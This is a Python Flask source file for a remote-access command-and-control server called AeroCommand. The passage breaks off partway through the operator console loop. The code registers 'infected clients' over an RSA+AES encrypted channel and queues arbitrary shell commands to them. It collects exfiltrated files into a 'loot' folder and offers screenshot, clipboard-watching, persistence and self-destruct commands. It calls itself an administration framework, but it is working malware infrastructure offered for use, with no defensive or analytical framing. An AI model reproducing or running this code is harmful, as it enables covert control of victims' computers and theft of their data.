from flask import Flask, request, jsonify, Response
import functools
import hmac
import threading
import logging
import base64
import os
import queue
import time
import json
import sqlite3
import sys
from datetime import datetime
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # Cloud hosts inject env vars directly — .env loading is optional

# Force UTF-8 console output — cp1252 terminals crash on ✓/emoji prints (500s on /register)
for _stream in (sys.stdout, sys.stderr):
    if _stream and hasattr(_stream, 'reconfigure'):
        try:
            _stream.reconfigure(encoding='utf-8', errors='replace')
        except Exception:
            pass

# Suppress Flask logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
# Reject oversized request bodies before buffering them (Flask answers 413)
app.config["MAX_CONTENT_LENGTH"] = 100 * 1024 * 1024

# Cap stored command output (must exceed client's JSON_FILES payload ~500 items)
MAX_LOG_OUTPUT = 512 * 1024

# === Operator Authentication ===
OPERATOR_TOKEN = os.getenv("OPERATOR_TOKEN", "")
if not OPERATOR_TOKEN:
    print("[!] WARNING: OPERATOR_TOKEN not set in .env — API endpoints are open!")
    print("[!] Set OPERATOR_TOKEN in .env to protect operator API endpoints.")

def require_auth(f):
    """Decorator: require a valid Bearer token on operator API requests."""
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        # Allow CORS preflight OPTIONS through without auth
        if request.method == 'OPTIONS':
            return f(*args, **kwargs)
        if not OPERATOR_TOKEN:
            return jsonify({"error": "Server has no operator token configured"}), 503
        token = request.headers.get("Authorization", "")
        if not token.startswith("Bearer "):
            return jsonify({"error": "Missing or invalid Authorization header"}), 401
        if not hmac.compare_digest(token[7:], OPERATOR_TOKEN):
            return jsonify({"error": "Invalid operator token"}), 403
        return f(*args, **kwargs)
    return decorated

DB_FILE = "aerocommand.db"

# Verbose console: local interactive terminals print full command output for
# testing; headless/cloud (Render) stays quiet since nobody watches stdout.
# Toggle anytime with the `verbose on|off` console command.
VERBOSE_CONSOLE_CAP = 8 * 1024  # max chars printed in verbose mode
_verbose_console = bool(sys.stdin and sys.stdin.isatty())

# === Operator SSE push hub ===
# Each connected operator GUI holds one Queue; mutations broadcast events so the
# console gets instant updates instead of polling /api/logs every 750ms.
event_queues = []
eq_lock = threading.Lock()


def broadcast(event: dict):
    """Fan out an event to all connected operator streams; drop dead queues."""
    with eq_lock:
        dead = []
        for q in event_queues:
            try:
                q.put_nowait(event)
            except queue.Full:
                dead.append(q)
            except Exception:
                dead.append(q)
        for q in dead:
            if q in event_queues:
                event_queues.remove(q)


def _clients_payload():
    """Shape infected_clients into the same dict list /api/clients returns."""
    client_list = []
    with cmd_lock:
        for cid, info in infected_clients.items():
            last_seen_str = info['last_seen'].strftime("%Y-%m-%d %H:%M:%S") if isinstance(info.get('last_seen'), datetime) else str(info.get('last_seen', ''))
            client_list.append({
                'id': cid,
                'host': info.get('host', 'Unknown'),
                'ip': info.get('ip', '0.0.0.0'),
                'pid': int(info.get('pid', 0)),
                'os': info.get('os', 'Unknown'),
                'user': info.get('user', 'unknown'),
                'admin': bool(info.get('admin', False)),
                'first_seen': str(info.get('registered', '')),
                'last_seen': last_seen_str,
                'status': 'ALIVE',
                'cpu_usage': 0.0,
                'ram_usage': 0.0,
                'disk_usage': 0.0,
                'net_usage': 0.0
            })
    return client_list

def db_connect():
    """Open a DB connection tuned for concurrent access (Flask threads + CLI)"""
    conn = sqlite3.connect(DB_FILE, timeout=10)
    conn.execute("PRAGMA busy_timeout = 5000")
    return conn

def init_db():
    """Initialize SQLite database for storing clients, commands, and logs"""
    with db_connect() as conn:
        cursor = conn.cursor()
        # WAL mode: concurrent readers don't block the heartbeat/API writers
        cursor.execute("PRAGMA journal_mode=WAL")
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS clients (
                client_id TEXT PRIMARY KEY,
                host TEXT,
                ip TEXT,
                pid INTEGER,
                os TEXT,
                user TEXT,
                admin INTEGER,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS command_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                output TEXT,
                timestamp TEXT
            )
        """)
        conn.commit()

def db_save_client(info):
    """Save or update client registration in SQLite"""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with db_connect() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO clients (client_id, host, ip, pid, os, user, admin, first_seen, last_seen, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'ALIVE')
                ON CONFLICT(client_id) DO UPDATE SET
                    pid=excluded.pid,
                    last_seen=excluded.last_seen,
                    status='ALIVE'
            """, (
                info['client_id'],
                info.get('host', 'unknown'),
                info.get('ip', 'unknown'),
                info.get('pid', 0),
                info.get('os', 'Unknown'),
                info.get('user', 'unknown'),
                1 if info.get('admin') else 0,
                now,
                now
            ))
            conn.commit()
    except Exception as e:
        print(f"[!] DB save_client failed: {e}")

def db_log_command(client_id, command, output):
    """Log executed command output into SQLite; returns the new row id"""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with db_connect() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO command_logs (client_id, command, output, timestamp)
                VALUES (?, ?, ?, ?)
            """, (client_id, command, output[:MAX_LOG_OUTPUT], now))
            conn.commit()
            return cursor.lastrowid
    except Exception as e:
        print(f"[!] DB log_command failed: {e}")
        return None

init_db()

pending_commands = {}
infected_clients = {}
results = []
cmd_lock = threading.Lock()
target_client = None

# === AES-256 + RSA Hybrid Encryption ===
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes

# Generate or load server RSA key pair
# Priority: 1) RSA_PRIVATE_KEY env var — accepts base64-encoded PEM, raw PEM with
#              literal \n escapes, or a quoted multi-line PEM (cloud/Render)
#           2) server_rsa.pem file (local dev)
#           3) Generate new key pair (persisted so restarts keep sessions alive)
RSA_KEY_FILE = "server_rsa.pem"


def _import_pem_candidates(env_value: str):
    """Yield byte candidates for the env var in the formats operators commonly paste."""
    try:
        yield base64.b64decode(env_value)
    except Exception:
        pass
    yield env_value.replace("\\n", "\n").encode()
    yield env_value.encode()


server_rsa_key = None
_rsa_env = os.getenv("RSA_PRIVATE_KEY", "").strip()
if _rsa_env:
    for cand in _import_pem_candidates(_rsa_env):
        try:
            server_rsa_key = RSA.import_key(cand)
            print("[+] RSA key loaded from RSA_PRIVATE_KEY environment variable")
            break
        except Exception:
            continue
    if server_rsa_key is None:
        print(f"[!] RSA_PRIVATE_KEY env var is set but unreadable (expected base64-encoded "
              f"PEM: python -c \"import base64;print(base64.b64encode(open('server_rsa.pem','rb').read()).decode())\")")
        print("[!] Falling back to key file / fresh generation...")

if server_rsa_key is None and os.path.exists(RSA_KEY_FILE):
    try:
        with open(RSA_KEY_FILE, "rb") as f:
            server_rsa_key = RSA.import_key(f.read())
        print(f"[+] RSA key loaded from {RSA_KEY_FILE}")
    except Exception:
        server_rsa_key = None

if server_rsa_key is None:
    server_rsa_key = RSA.generate(2048)
    with open(RSA_KEY_FILE, "wb") as f:
        f.write(server_rsa_key.export_key())
    print(f"[+] New RSA key pair generated and saved to {RSA_KEY_FILE}")


server_rsa_public = server_rsa_key.publickey().export_key().decode()

# Client session keys mapping: client_id -> 32-byte AES key
client_sessions = {}
session_lock = threading.Lock()

def encrypt_aes(data: str, aes_key: bytes) -> str:
    """Encrypt string with AES-256-GCM and return base64 encoded payload (nonce + tag + ciphertext)"""
    cipher = AES.new(aes_key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode('utf-8'))
    payload = cipher.nonce + tag + ciphertext
    return base64.b64encode(payload).decode()

def decrypt_aes(raw_b64: str, aes_key: bytes) -> str:
    """Decrypt base64 encoded AES-256-GCM payload"""
    raw = base64.b64decode(raw_b64)
    nonce = raw[:16]
    tag = raw[16:32]
    ciphertext = raw[32:]
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
    return decrypted.decode('utf-8')

def decrypt_payload(client_id=None):
    """Decrypt incoming request body. Strict: only two formats are accepted.
    1. Hybrid RSA+AES JSON packet (/register handshake)
    2. AES-256-GCM binary body (all other endpoints)
    Plaintext JSON is rejected — the channel cannot degrade."""
    if not client_id:
        client_id = request.args.get("id")

    # 1. Hybrid RSA+AES registration packet (application/json)
    data = request.get_json(silent=True)
    if isinstance(data, dict) and "encrypted_session_key" in data and "payload" in data:
        try:
            print("[*] Processing hybrid RSA+AES registration packet...")
            rsa_cipher = PKCS1_OAEP.new(server_rsa_key, hashAlgo=SHA256)
            enc_session_key = base64.b64decode(data["encrypted_session_key"])
            aes_key = rsa_cipher.decrypt(enc_session_key)

            decrypted_inner = decrypt_aes(data["payload"], aes_key)
            inner_payload = json.loads(decrypted_inner)

            cid = inner_payload.get("client_id")
            if cid:
                with session_lock:
                    client_sessions[cid] = aes_key
                print(f"[+] AES session key established for client: {cid}")
            return inner_payload
        except Exception as e:
            print(f"[!] Hybrid Decryption failed: {e}")
            import traceback
            traceback.print_exc()
            return {}

    # 2. AES-GCM binary body (application/octet-stream)
    raw = request.get_data()
    if not raw:
        return {}
    aes_key = client_sessions.get(client_id) if client_id else None
    if not aes_key:
        print(f"[!] Rejected plaintext/unregistered payload from {request.remote_addr}")
        return {}
    try:
        return json.loads(decrypt_aes(raw.decode('utf-8'), aes_key))
    except Exception as e:
        print(f"[!] AES Decryption failed: {e}")
        return {}

def encrypt_response(data, client_id=None):
    """Encrypt outgoing response dict with the client's AES session key.
    Returns an empty body when no session exists — never plaintext."""
    if client_id and client_id in client_sessions:
        return encrypt_aes(json.dumps(data), client_sessions[client_id])
    return ""

# === ANSI Colors ===
class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"

def sanitize_filename(name: str) -> str:
    """Strip directory components and unsafe characters from a client-supplied
    filename — prevents path traversal out of the loot directory."""
    base = os.path.basename(name.replace("\\", "/")).strip()
    cleaned = "".join(c if (c.isascii() and (c.isalnum() or c in ".-_")) else "_" for c in base)[:200]
    if not cleaned or set(cleaned) <= {"."}:
        return "unnamed_file"
    return cleaned

LOOT_DIR = "loot"
HEARTBEAT_TIMEOUT = 60  # seconds — mark client dead if no heartbeat
_client_connected_event = threading.Event()  # Signals input thread when a client registers
PROMPT = f"{C.RED}⚡ AeroCommand > {C.RESET}"

# ========== ROUTES ==========

@app.route("/test", methods=["GET"])
def test():
    return "SERVER RUNNING OK", 200

@app.route("/rsa_pub", methods=["GET"])
def get_rsa_pub():
    """Provide server RSA public key for client hybrid encryption handshake"""
    return server_rsa_public, 200


@app.route("/api/diag", methods=["POST", "OPTIONS"])
@require_auth
def api_diag():
    """Diagnostic endpoint: attempt to decrypt a registration packet and return detailed errors."""
    if request.method == "OPTIONS":
        return "", 200
    import traceback as _tb
    results = {"steps": []}
    try:
        data = request.get_json(silent=True)
        results["got_json"] = isinstance(data, dict)
        results["json_keys"] = list(data.keys()) if isinstance(data, dict) else None
        if not isinstance(data, dict) or "encrypted_session_key" not in data:
            results["error"] = "No hybrid packet found in JSON body"
            return jsonify(results), 200

        results["steps"].append("JSON parsed OK")

        # RSA decrypt
        enc_session_key = base64.b64decode(data["encrypted_session_key"])
        results["rsa_ciphertext_len"] = len(enc_session_key)
        results["server_rsa_key_bits"] = server_rsa_key.size_in_bits()
        results["steps"].append(f"RSA ciphertext: {len(enc_session_key)} bytes")

        rsa_cipher = PKCS1_OAEP.new(server_rsa_key, hashAlgo=SHA256)
        aes_key = rsa_cipher.decrypt(enc_session_key)
        results["aes_key_len"] = len(aes_key)
        results["steps"].append(f"RSA decrypted OK, AES key: {len(aes_key)} bytes")

        # AES decrypt
        decrypted_inner = decrypt_aes(data["payload"], aes_key)
        results["steps"].append("AES decrypted OK")
        inner = json.loads(decrypted_inner)
        results["steps"].append("JSON parsed inner payload OK")
        results["client_id"] = inner.get("client_id")
        results["success"] = True
    except Exception as e:
        results["error"] = str(e)
        results["traceback"] = _tb.format_exc()
    return jsonify(results), 200


@app.route("/register", methods=["POST"])
def register():
    global target_client
    info = decrypt_payload()
    if not info:
        print(f"[!] Registration failed for {request.remote_addr}: No data received or decryption failed.")
        raw = request.get_data(as_text=True) or ''
        print(f"[DEBUG] Raw data (truncated): {raw[:200]}")
        return "Invalid Data", 400
        
    client_id = info.get("client_id")
    if not client_id:
        ip = info.get('ip', request.remote_addr)
        pid = info.get('pid', 'unknown')
        client_id = f"{ip}:{pid}"
        # Ensure client_id is in the dict for downstream functions
        info['client_id'] = client_id
        
    print(f"[*] Registration request received from: {client_id}")
    now = datetime.now()
    new_host = info.get('host', 'unknown')
    new_ip = info.get('ip', 'unknown')

    with cmd_lock:
        # Deduplicate: remove any existing client with the same hostname + IP
        # (i.e., same machine reconnecting with a different PID)
        stale_ids = [
            cid for cid, c in infected_clients.items()
            if cid != client_id and c['host'] == new_host and c['ip'] == new_ip
        ]
        for stale in stale_ids:
            del infected_clients[stale]
            if stale in pending_commands:
                del pending_commands[stale]
            # If we were targeting the stale client, retarget to the new one
            if target_client == stale:
                target_client = client_id

        is_new = client_id not in infected_clients
        infected_clients[client_id] = {
            'ip': new_ip,
            'host': new_host,
            'pid': info.get('pid', 0),
            'os': info.get('os', 'Unknown'),
            'user': info.get('user', 'unknown'),
            'admin': info.get('admin', False),
            'registered': now.strftime("%H:%M:%S"),
            'last_seen': now,
        }
        db_save_client(info)

    if is_new:
        admin_tag = f" {C.RED}[ADMIN]{C.RESET}" if info.get('admin') else ""
        replaced_msg = f" {C.YELLOW}(replaced stale session){C.RESET}" if stale_ids else ""
        print(f"\n{C.GREEN}[✓] NEW CLIENT CONNECTED:{C.RESET} {new_host} ({new_ip}) - PID: {info.get('pid', '?')}{admin_tag}{replaced_msg}")
        print(f"{C.CYAN}[•] Total clients: {len(infected_clients)}{C.RESET}\n")
        _client_connected_event.set()
        print(PROMPT, end="", flush=True)
        broadcast({'type': 'clients'})

    return "OK", 200


@app.route("/cmd", methods=["GET"])
def get_command():
    client_id = request.args.get("id")
    if not client_id:
        return "", 200

    # Update heartbeat
    with cmd_lock:
        if client_id not in infected_clients:
            # Unknown client — server was restarted and lost the session key.
            # Signal via 401 (empty body) so the channel never carries plaintext.
            return "", 401

        infected_clients[client_id]['last_seen'] = datetime.now()

        if client_id in pending_commands and pending_commands[client_id]:
            cmd = pending_commands[client_id].pop(0)
            if not pending_commands[client_id]:
                del pending_commands[client_id]
            return encrypt_response({"command": cmd}, client_id=client_id), 200

        return "", 200


@app.route("/result", methods=["POST"])
def post_result():
    # client_id passed as query param by client
    cid_from_param = request.args.get("id")
    data = decrypt_payload(client_id=cid_from_param)
    if not data:
        return "Undecryptable payload", 400
    output = data.get('output', '')
    client_id = data.get('client_id', request.remote_addr)
    timestamp = datetime.now().strftime("%H:%M:%S")

    # Resolve hostname from client_id
    with cmd_lock:
        if client_id in infected_clients:
            host_label = f"{infected_clients[client_id]['host']} ({infected_clients[client_id]['ip']})"
        else:
            host_label = client_id

    # Console stays quiet by default — raw output (base64 images, big listings)
    # goes to DB/UI only. Local interactive sessions default to verbose.
    command_name = data.get("command", "COMMAND_RESULT")
    if _verbose_console:
        shown = output[:VERBOSE_CONSOLE_CAP]
        suffix = f"\n{C.GRAY}[!] Output truncated at {VERBOSE_CONSOLE_CAP // 1024}KB (full result in DB/GUI){C.RESET}" if len(output) > VERBOSE_CONSOLE_CAP else ""
        print(f"{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET} {command_name}")
        print(f"{shown}{suffix}")
    else:
        print(f"{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET} "
              f"{command_name} ({len(output):,} chars)")
    results.append({"client": client_id, "output": output, "time": timestamp})
    if len(results) > 500:
        del results[:-500]
    log_id = db_log_command(client_id, command_name, output)
    if log_id is not None:
        broadcast({'type': 'log', 'log': {
            'id': log_id,
            'client_id': client_id,
            'command': command_name,
            'output': output[:MAX_LOG_OUTPUT],
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'status': 'SUCCESS'
        }})
    print(PROMPT, end="", flush=True)
    return "OK", 200


@app.route("/upload", methods=["POST"])
def upload_file():
    """Receive exfiltrated files from clients"""
    cid_from_param = request.args.get("id")
    data = decrypt_payload(client_id=cid_from_param)
    if not data:
        return "Undecryptable payload", 400
    filename = sanitize_filename(data.get("name", "unknown"))
    file_b64 = data.get("file", "")
    if len(file_b64) > 150 * 1024 * 1024:  # ~112MB decoded (base64 is ~1.33x)
        print(f"[!] Rejected oversized upload from {data.get('client_id', '?')}: {len(file_b64)} chars")
        return "File too large", 413
    try:
        file_data = base64.b64decode(file_b64)
    except Exception:
        return "Invalid file data", 400
    client_id = data.get("client_id", request.remote_addr)
    timestamp = datetime.now().strftime("%H:%M:%S")

    # Create loot directory per client
    with cmd_lock:
        if client_id in infected_clients:
            host = infected_clients[client_id]['host']
        else:
            host = "unknown"

    client_loot_dir = os.path.join(LOOT_DIR, host)
    os.makedirs(client_loot_dir, exist_ok=True)

    # Avoid overwriting — add timestamp if file exists
    save_path = os.path.join(client_loot_dir, filename)
    if os.path.exists(save_path):
        name, ext = os.path.splitext(filename)
        save_path = os.path.join(client_loot_dir, f"{name}_{int(time.time())}{ext}")

    with open(save_path, "wb") as f:
        f.write(file_data)

    print(f"\n{C.GREEN}[{timestamp}] 📥 FILE RECEIVED from {host}:{C.RESET} {filename} ({len(file_data)} bytes)")
    print(f"{C.GRAY}    Saved to: {save_path}{C.RESET}")
    print(PROMPT, end="", flush=True)
    broadcast({'type': 'loot'})
    return "OK", 200


# ==================== CONTROL PANEL REST API ====================

@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type,Authorization'
    response.headers['Access-Control-Allow-Methods'] = 'GET,POST,OPTIONS'
    return response


@app.route("/api/clients", methods=["GET", "OPTIONS"])
@require_auth
def api_get_clients():
    if request.method == "OPTIONS":
        return "", 200
    return jsonify(_clients_payload()), 200


@app.route("/api/logs", methods=["GET", "OPTIONS"])
@require_auth
def api_get_logs():
    if request.method == "OPTIONS":
        return "", 200

    log_list = []
    with db_connect() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT id, client_id, command, output, timestamp FROM command_logs ORDER BY id DESC LIMIT 100")
        for row in cursor.fetchall():
            log_list.append({
                'id': row[0],
                'client_id': row[1],
                'command': row[2],
                'output': row[3],
                'timestamp': row[4],
                'status': 'SUCCESS'
            })
    return jsonify(list(reversed(log_list))), 200


@app.route("/api/events", methods=["GET"])
def sse_events():
    """Server-Sent Events stream for the operator console.
    Auth via Bearer header or ?token= (EventSource cannot set headers).
    Optional ?since=<log_id> replays newer rows to close reconnect gaps."""
    # Manual auth: EventSource can't send an Authorization header
    if OPERATOR_TOKEN:
        token = ""
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
        elif request.args.get("token"):
            token = request.args.get("token")
        if not token or not hmac.compare_digest(token, OPERATOR_TOKEN):
            return jsonify({"error": "Invalid operator token"}), 403

    since = request.args.get("since", type=int)

    def shape_log(row):
        return {
            'id': row[0], 'client_id': row[1], 'command': row[2],
            'output': row[3], 'timestamp': row[4], 'status': 'SUCCESS'
        }

    def stream():
        q = queue.Queue(maxsize=200)
        with eq_lock:
            event_queues.append(q)
        try:
            try:
                # Snapshot + replay anything the operator missed while offline
                replay = []
                if since is not None:
                    with db_connect() as conn:
                        cursor = conn.cursor()
                        cursor.execute(
                            "SELECT id, client_id, command, output, timestamp FROM command_logs "
                            "WHERE id > ? ORDER BY id ASC LIMIT 200", (since,))
                        replay = [shape_log(r) for r in cursor.fetchall()]
                snapshot = {'type': 'sync', 'clients': _clients_payload(), 'replay': replay}
                yield f"data: {json.dumps(snapshot)}\n\n"

                while True:
                    try:
                        ev = q.get(timeout=20)
                        yield f"data: {json.dumps(ev)}\n\n"
                    except queue.Empty:
                        # Comment ping keeps proxies from closing idle streams
                        yield ": keepalive\n\n"
            except GeneratorExit:
                raise
        finally:
            with eq_lock:
                if q in event_queues:
                    event_queues.remove(q)

    return Response(stream(), mimetype="text/event-stream", headers={
        "Cache-Control": "no-cache",
        "X-Accel-Buffering": "no",   # disable proxy buffering (nginx/Render edge)
    })


@app.route("/api/send_command", methods=["POST", "OPTIONS"])
@require_auth
def api_send_command():
    if request.method == "OPTIONS":
        return "", 200

    data = request.get_json(silent=True) or {}
    client_id = data.get("client_id")
    command = data.get("command")

    if not client_id or not command:
        return jsonify({"error": "Missing client_id or command"}), 400

    with cmd_lock:
        if client_id not in pending_commands:
            pending_commands[client_id] = []
        pending_commands[client_id].append(command)

    db_log_command(client_id, command, "Queued via Control Panel API...")
    return jsonify({"status": "QUEUED", "client_id": client_id, "command": command}), 200


@app.route("/api/loot", methods=["GET", "OPTIONS"])
@require_auth
def api_get_loot():
    if request.method == "OPTIONS":
        return "", 200

    loot_list = []
    if os.path.exists(LOOT_DIR):
        for root, _, files in os.walk(LOOT_DIR):
            for file in files:
                fpath = os.path.join(root, file)
                stat = os.stat(fpath)
                client_name = os.path.basename(root)
                loot_list.append({
                    'name': file,
                    'path': fpath.replace('\\', '/'),
                    'size': stat.st_size,
                    'timestamp': datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
                    'client': client_name
                })
    return jsonify(loot_list), 200


# ========== CLI FUNCTIONS ==========

def show_banner():
    banner = f"""
{C.RED}{C.BOLD}
  █████╗ ███████╗██████╗  ██████╗  ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
 ██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
 ███████║█████╗  ██████╔╝██║   ██║██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
 ██╔══██║██╔══╝  ██╔══██╗██║   ██║██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
 ██║  ██║███████╗██║  ██║╚██████╔╝╚██████╗╚██████╔╝██║ └──═╝██║██║ └──═╝██║██║  ██║██║ ╚████║██████╔╝
 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
{C.RESET}{C.GRAY}  Endpoint Telemetry & Administration Framework — C2 Server
  {C.RED}─────────────────────────────────────────────────────────────────────────────────────────────{C.RESET}
"""
    print(banner)


def show_help():
    print(f"""
{C.BOLD}{'='*55}
  AVAILABLE COMMANDS
{'='*55}{C.RESET}

  {C.CYAN}Session Management:{C.RESET}
  {C.GREEN}list{C.RESET}              Show all connected clients
  {C.GREEN}target <id>{C.RESET}       Target specific client (e.g., target 0)
  {C.GREEN}broadcast <cmd>{C.RESET}   Send command to ALL clients

  {C.CYAN}Client Commands:{C.RESET}
  {C.GREEN}sysinfo{C.RESET}           Get detailed system info
  {C.GREEN}screenshot{C.RESET}        Capture client's screen
  {C.GREEN}cd <path>{C.RESET}         Change client working directory
  {C.GREEN}pwd{C.RESET}              Print client working directory
  {C.GREEN}ls [path]{C.RESET}         Browse files/folders with details
  {C.GREEN}download <path>{C.RESET}   Exfiltrate file from client
  {C.GREEN}upload <url> <dst>{C.RESET} Download file to client
  {C.GREEN}sleep <seconds>{C.RESET}   Change client polling interval
  {C.GREEN}persist{C.RESET}           Re-apply persistence on client
  {C.GREEN}dialog <title> | <msg>{C.RESET}  Show popup dialog on client

  {C.CYAN}Clipboard:{C.RESET}
  {C.GREEN}clip{C.RESET}              Grab current clipboard text
  {C.GREEN}clipwatch{C.RESET}         Start live clipboard monitor
  {C.GREEN}clipstop{C.RESET}          Stop clipboard monitor

  {C.CYAN}Danger Zone:{C.RESET}
  {C.RED}kill{C.RESET}              Self-destruct client (removes & deletes)

  {C.CYAN}Server & Database:{C.RESET}
  {C.GREEN}db clients{C.RESET}         Show historical registered clients from database
  {C.GREEN}db logs [limit]{C.RESET}    Show command logs stored in database
  {C.GREEN}verbose [on|off]{C.RESET}   Toggle full raw output printing (default: on locally, off in cloud)
  {C.GREEN}help{C.RESET}              Show this help menu
  {C.GREEN}clear{C.RESET}             Clear screen
  {C.GREEN}exit{C.RESET}              Quit the server 

  {C.GRAY}Or type any shell command to execute on targeted client{C.RESET}
{'='*55}
""")


def show_clients():
    with cmd_lock:
        if not infected_clients:
            print(f"\n{C.YELLOW}[!] No clients connected yet{C.RESET}")
            return
        now = datetime.now()
        print(f"\n{C.BOLD}{'='*85}")
        print(f"  CONNECTED CLIENTS")
        print(f"{'='*85}{C.RESET}")

        for idx, (cid, info) in enumerate(infected_clients.items()):
            marker = f" {C.RED}→{C.RESET} " if target_client == cid else "   "
            admin_tag = f" {C.RED}[ADMIN]{C.RESET}" if info.get('admin') else ""

            # Check if alive
            last_seen = info.get('last_seen', now)
            elapsed = (now - last_seen).total_seconds()
            if elapsed > HEARTBEAT_TIMEOUT:
                status = f"{C.RED}DEAD{C.RESET}"
            elif elapsed > HEARTBEAT_TIMEOUT / 2:
                status = f"{C.YELLOW}SLOW{C.RESET}"
            else:
                status = f"{C.GREEN}ALIVE{C.RESET}"

            print(f"{marker}[{idx}] {info['host']} | {info['ip']} | PID:{info['pid']} | {info.get('os', '?')} | {info.get('user', '?')}{admin_tag} | {status} | {info['registered']}")

        print(f"{'='*85}\n")


def cleanup_dead_clients():
    """Remove clients that haven't been seen in a while"""
    global target_client
    with cmd_lock:
        now = datetime.now()
        dead = [cid for cid, info in infected_clients.items()
                if (now - info.get('last_seen', now)).total_seconds() > HEARTBEAT_TIMEOUT * 3]
        for cid in dead:
            del infected_clients[cid]
            if cid in pending_commands:
                del pending_commands[cid]
            with session_lock:
                client_sessions.pop(cid, None)
        # Reset target if it was pointing to a dead client
        if target_client in dead:
            target_client = None
            if infected_clients:
                target_client = list(infected_clients.keys())[0]
                info = infected_clients[target_client]
                print(f"\n{C.YELLOW}[!] Target was dead. Auto-retargeting → {info['host']} ({info['ip']}){C.RESET}")
        if dead:
            print(f"\n{C.YELLOW}[!] Removed {len(dead)} dead client(s){C.RESET}")
            print(PROMPT, end="", flush=True)


def heartbeat_monitor():
    """Background thread to clean up stale clients"""
    while True:
        time.sleep(30)
        cleanup_dead_clients()


def input_thread_func():
    global target_client
    time.sleep(0.5)  # Brief wait for Flask listener to bind
    show_banner()
    show_help()

    # Initial reconnection window — breaks early if a client connects
    for i in range(5, 0, -1):
        if _client_connected_event.is_set():
            break
        sys.stdout.write(f"\r{C.CYAN}[*] Waiting {i}s for active endpoints to reconnect...{C.RESET}")
        sys.stdout.flush()
        time.sleep(1)

    sys.stdout.write("\r" + " " * 65 + "\r")  # Clear timer line
    sys.stdout.flush()
    _client_connected_event.clear()
    show_clients()

    while True:
        try:
            cmd = input(PROMPT).strip()

            if not cmd:
                continue

            elif cmd.lower() == "help":
                show_help()

            elif cmd.lower() == "list":
                show_clients()

            elif cmd.lower() == "verbose" or cmd.lower().startswith("verbose "):
                global _verbose_console
                arg = cmd.split(None, 1)[1].strip().lower() if len(cmd.split(None, 1)) > 1 else ""
                if arg == "on":
                    _verbose_console = True
                elif arg == "off":
                    _verbose_console = False
                state = f"{C.GREEN}ON{C.RESET}" if _verbose_console else f"{C.RED}OFF{C.RESET}"
                print(f"[i] Verbose console: {state} — raw client output "
                      + ("printed (capped at 8KB)" if _verbose_console else "hidden; DB/GUI only"))

            elif cmd.lower() == "db clients":
                with db_connect() as conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT client_id, host, ip, pid, user, first_seen, last_seen, status FROM clients")
                    rows = cursor.fetchall()
                    if not rows:
                        print(f"\n{C.YELLOW}[!] No database client records found{C.RESET}")
                    else:
                        print(f"\n{C.BOLD}{'='*90}\n  DATABASE CLIENT HISTORY\n{'='*90}{C.RESET}")
                        for r in rows:
                            print(f"  ID: {r[0]} | Host: {r[1]} ({r[2]}) | PID: {r[3]} | User: {r[4]} | First: {r[5]} | Last: {r[6]} | Status: {r[7]}")
                        print(f"{'='*90}\n")

            elif cmd.lower().startswith("db logs"):
                parts = cmd.split()
                limit = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 10
                with db_connect() as conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT id, client_id, timestamp, output FROM command_logs ORDER BY id DESC LIMIT ?", (limit,))
                    rows = cursor.fetchall()
                    if not rows:
                        print(f"\n{C.YELLOW}[!] No database logs found{C.RESET}")
                    else:
                        print(f"\n{C.BOLD}{'='*90}\n  RECENT DB COMMAND LOGS (Last {limit})\n{'='*90}{C.RESET}")
                        for r in rows:
                            snippet = r[3].replace("\n", " ")[:60]
                            print(f"  [{r[0]}] {r[2]} | Client: {r[1]} | {snippet}...")
                        print(f"{'='*90}\n")

            elif cmd.lower().startswith("target"):
                parts = cmd.split()
                if len(parts) == 2:
                    try:
                        idx = int(parts[1])
                        with cmd_lock:
                            clients_list = list(infected_clients.keys())
                            if 0 <= idx < len(clients_list):
                                target_client = clients_list[idx]
                                info = infected_clients[target_client]
